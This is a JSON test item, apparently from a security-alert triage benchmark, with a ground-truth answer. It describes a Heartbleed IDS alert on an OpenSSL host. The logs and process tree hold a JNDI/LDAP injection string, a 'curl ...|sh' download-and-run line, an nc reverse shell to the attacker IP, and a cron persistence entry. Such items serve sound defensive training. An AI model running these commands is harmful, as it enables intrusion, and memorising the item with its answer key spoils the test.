@@ -1,0 +1,78 @@
+{
+  "id": "A-1007",
+  "alert": {
+    "src": "203.0.113.96",
+    "dst": "10.2.6.51",
+    "dst_port": 443,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Heartbleed Data Leak",
+    "claimed_cve": "CVE-2014-0160",
+    "severity": "high",
+    "ts": "2026-09-13T04:54:00Z",
+    "flow_id": "f6820"
+  },
+  "world": {
+    "assets": {
+      "10.2.6.51": {
+        "host": "host-10-2-6-51",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "443": {
+            "product": "openssl",
+            "version": "1.0.0"
+          }
+        },
+        "peers": [
+          "10.2.2.165"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2014-0160": {
+        "product": "openssl",
+        "patched_in": "1.0.1g",
+        "exploit_maturity": "poc"
+      }
+    },
+    "flows": {
+      "f6820": {
+        "direction": "outbound",
+        "bytes_out": 84213,
+        "bytes_in": 512,
+        "duration_s": 604,
+        "state": "ESTABLISHED",
+        "note": "periodic 60s beacon to external host"
+      }
+    },
+    "logs": {
+      "host-10-2-6-51": [
+        "[host-10-2-6-51] 443 POST /api/x 200 jndi:ldap://203.0.113.96/a  <- payload accepted",
+        "[host-10-2-6-51] spawned /bin/sh from service process"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-6-51": {
+        "suspicious": true,
+        "tree": "java -> sh -c 'curl 203.0.113.96|sh' -> nc 203.0.113.96 4444",
+        "persistence": "cron @reboot /tmp/.beacon"
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.96",
+        "dst": "10.2.6.51",
+        "port": 443,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "SUCCEEDED",
+    "action": "contain"
+  },
+  "adversarial": false,
+  "solve_rationale": "vulnerable version + shell spawned + outbound beacon"
+}
